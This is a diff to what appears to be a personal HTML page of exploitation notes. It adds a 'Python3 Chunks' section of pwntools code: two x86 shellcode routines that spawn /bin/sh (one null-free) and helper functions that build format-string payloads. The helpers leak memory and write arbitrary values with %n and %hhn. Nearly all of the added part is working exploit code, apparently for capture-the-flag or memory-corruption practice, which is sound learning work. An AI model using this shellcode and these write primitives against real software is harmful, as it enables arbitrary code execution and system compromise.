@@ -295,5 +295,114 @@ ffb29000-ffb4a000 rw-p 00000000            [stack]</div></pre>
 	"size-1". As long as fgets is successful it will append a '\0' to the
 	end of the string. A '\0' is never stored in "s[size]".</p>
 
+	<h1><span class="GruvboxAqua">Python3 Chunks</span></h1>
+
+	<p>Things that I always do in python3 but always forget how to do.
+	Hopefully this will save me a couple of key strokes in my life time.</p>
+
+	<pre><div class="code"><span class="Comment">#!/usr/bin/env python3</span>
+
+<span class="GruvboxBlue">from</span> pwn <span class="GruvboxBlue">import</span> *
+
+context.arch = <span class="String">'</span><span class="String">i386</span><span class="String">'</span>
+context.bits = <span class="GruvboxPurple">32</span>
+
+<span class="Comment"># 23 bytes</span>
+<span class="GruvboxRed">def</span> <span class="GruvboxAqua">get_bin_sh</span>():
+    <span class="GruvboxRed">return</span> asm(<span class="String">'''</span>
+<span class="String">        /* execve(&quot;/bin/sh&quot;, NULL, NULL) */</span>
+
+<span class="String">        /* push &quot;/bin/sh&quot; */</span>
+<span class="String">        push 0x0068732f</span>
+<span class="String">        push 0x6e69622f</span>
+<span class="String">        mov eax, SYS_execve</span>
+<span class="String">        mov ebx, esp</span>
+<span class="String">        xor ecx, ecx</span>
+<span class="String">        xor edx, edx</span>
+<span class="String">        int 0x80</span>
+<span class="String">    </span><span class="String">'''</span>)
+
+<span class="Comment"># 24 bytes</span>
+<span class="GruvboxRed">def</span> <span class="GruvboxAqua">get_bin_sh_no_nulls</span>():
+    <span class="GruvboxRed">return</span> asm(<span class="String">'''</span>
+<span class="String">        /* execve(&quot;/bin/sh&quot;, NULL, NULL) */</span>
+
+<span class="String">        /* push &quot;/bin//sh&quot; */</span>
+<span class="String">        xor ecx, ecx</span>
+<span class="String">        push ecx</span>
+<span class="String">        push 0x68732f2f</span>
+<span class="String">        push 0x6e69622f</span>
+<span class="String">        xor eax, eax</span>
+<span class="String">        xor eax, SYS_execve</span>
+<span class="String">        mov ebx, esp</span>
+<span class="String">        xor edx, edx</span>
+<span class="String">        int 0x80</span>
+<span class="String">    </span><span class="String">'''</span>)
+
+<span class="Comment"># Convert an integer to a byte string, useful for format string payloads</span>
+<span class="GruvboxRed">def</span> <span class="GruvboxAqua">bstr</span>(n):
+    <span class="GruvboxRed">return</span> <span class="GruvboxOrange">str</span>(n).encode(<span class="String">'</span><span class="String">UTF-8</span><span class="String">'</span>)
+
+<span class="Comment"># Convert a 32bit int to array of four bytes</span>
+<span class="Comment"># e.g. 0x12345678 becomes [0x12, 0x34, 0x56, 0x78]</span>
+<span class="Comment"># Can take integers less than 0x10000000</span>
+<span class="GruvboxRed">def</span> <span class="GruvboxAqua">int_to_arr</span>(n):
+    h = <span class="GruvboxOrange">hex</span>(n)
+    <span class="GruvboxRed">while</span> <span class="GruvboxOrange">len</span>(h) &lt; <span class="GruvboxOrange">len</span>(<span class="String">'</span><span class="String">0x12345678</span><span class="String">'</span>):
+        h = h[:<span class="GruvboxPurple">2</span>] + <span class="String">'</span><span class="String">0</span><span class="String">'</span> + h[<span class="GruvboxPurple">2</span>:]
+    <span class="GruvboxRed">return</span> [<span class="GruvboxOrange">int</span>(h[i:i+<span class="GruvboxPurple">2</span>], <span class="GruvboxPurple">16</span>) <span class="GruvboxRed">for</span> i <span class="GruvboxRed">in</span> <span class="GruvboxOrange">range</span>(<span class="GruvboxPurple">2</span>, <span class="GruvboxPurple">10</span>, <span class="GruvboxPurple">2</span>)]
+
+<span class="Comment"># Used to check if our offset is valid</span>
+<span class="Comment"># pre -&gt; byte string to be added to start of payload</span>
+<span class="Comment"># offset -&gt; offset to the 0x33333333 value</span>
+<span class="GruvboxRed">def</span> <span class="GruvboxAqua">fmt_check_offset</span>(pre, offset):
+    ret = pre
+    ret += p32(<span class="GruvboxPurple">0x33333333</span>)
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(offset) + b<span class="String">'</span><span class="String">$p</span><span class="String">'</span>
+    <span class="GruvboxRed">return</span> ret
+
+<span class="Comment"># Read a string ad a given address</span>
+<span class="Comment"># pre -&gt; byte string to be added to start of payload</span>
+<span class="Comment"># addr -&gt; Address to write to</span>
+<span class="Comment"># offset -&gt; The format string modifier offset to reach the addr</span>
+<span class="GruvboxRed">def</span> <span class="GruvboxAqua">fmt_read_string</span>(pre, addr, offset):
+    ret = pre
+    ret += p32(addr)
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(offset) + b<span class="String">'</span><span class="String">$s</span><span class="String">'</span>
+    <span class="GruvboxRed">return</span> ret
+
+<span class="Comment"># normal 4byte write</span>
+<span class="Comment"># pre -&gt; bytes added to start of string</span>
+<span class="Comment"># addr -&gt; Address to write to</span>
+<span class="Comment"># val -&gt; Value to write, must be larger than len(pre + p32(addr))</span>
+<span class="Comment"># offset -&gt; The format string modifier offset to reach the addr</span>
+<span class="GruvboxRed">def</span> <span class="GruvboxAqua">fmt_poke_word</span>(pre, addr, value, offset):
+    ret = pre
+    ret += p32(addr)
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(value - <span class="GruvboxOrange">len</span>(ret)) + b<span class="String">'</span><span class="String">c</span><span class="String">'</span>
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(offset) + b<span class="String">'</span><span class="String">$n</span><span class="String">'</span>
+    <span class="GruvboxRed">return</span> ret
+
+<span class="Comment"># Do a 4 byte write with a format string but doing one byte at a time</span>
+<span class="Comment"># pre -&gt; bytes added to start of string</span>
+<span class="Comment"># addr -&gt; Address to write to</span>
+<span class="Comment"># val -&gt; Array of four byte values to write</span>
+<span class="Comment"># offset -&gt; The format string modifier offset to reach the addr</span>
+<span class="GruvboxRed">def</span> <span class="GruvboxAqua">fmt_poke_bytes</span>(pre, addr, val, offset):
+    ret = pre
+    ret += p32(addr)
+    ret += p32(addr + <span class="GruvboxPurple">1</span>)
+    ret += p32(addr + <span class="GruvboxPurple">2</span>)
+    ret += p32(addr + <span class="GruvboxPurple">3</span>)
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(<span class="GruvboxPurple">256</span> + val[<span class="GruvboxPurple">0</span>] - <span class="GruvboxOrange">len</span>(ret)) + b<span class="String">'</span><span class="String">c</span><span class="String">'</span>
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(offset) + b<span class="String">'</span><span class="String">$hhn</span><span class="String">'</span>
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(<span class="GruvboxPurple">256</span> + val[<span class="GruvboxPurple">1</span>] - val[<span class="GruvboxPurple">0</span>]) + b<span class="String">'</span><span class="String">c</span><span class="String">'</span>
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(offset + <span class="GruvboxPurple">1</span>) + b<span class="String">'</span><span class="String">$hhn</span><span class="String">'</span>
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(<span class="GruvboxPurple">256</span> + val[<span class="GruvboxPurple">2</span>] - val[<span class="GruvboxPurple">1</span>]) + b<span class="String">'</span><span class="String">c</span><span class="String">'</span>
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(offset + <span class="GruvboxPurple">2</span>) + b<span class="String">'</span><span class="String">$hhn</span><span class="String">'</span>
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(<span class="GruvboxPurple">256</span> + val[<span class="GruvboxPurple">3</span>] - val[<span class="GruvboxPurple">2</span>]) + b<span class="String">'</span><span class="String">c</span><span class="String">'</span>
+    ret += b<span class="String">'</span><span class="String">%</span><span class="String">'</span> + bstr(offset + <span class="GruvboxPurple">3</span>) + b<span class="String">'</span><span class="String">$hhn</span><span class="String">'</span>
+    <span class="GruvboxRed">return</span> ret</div></pre>
+
 	</main></body>
 </html>
